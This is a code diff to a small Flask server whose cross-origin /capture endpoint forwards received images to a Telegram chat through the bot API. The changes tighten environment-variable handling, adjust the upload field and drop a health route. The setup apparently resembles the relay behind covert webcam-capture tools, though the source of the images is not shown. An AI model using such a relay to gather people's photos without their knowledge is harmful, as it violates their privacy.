@@ -7,14 +7,14 @@ import os
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHAT_ID = os.environ.get("CHAT_ID")
+BOT_TOKEN = os.environ["BOT_TOKEN"]
+CHAT_ID = os.environ["CHAT_ID"]
 
 TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 
 def send_photo_async(image_bytes):
     files = {
-        "photo": ("image.jpg", image_bytes)
+        "photo": image_bytes
     }
     data = {
         "chat_id": CHAT_ID
@@ -32,7 +32,3 @@ def capture():
     ).start()
 
     return "OK", 200
-
-@app.route("/")
-def health():
-    return "alive", 200
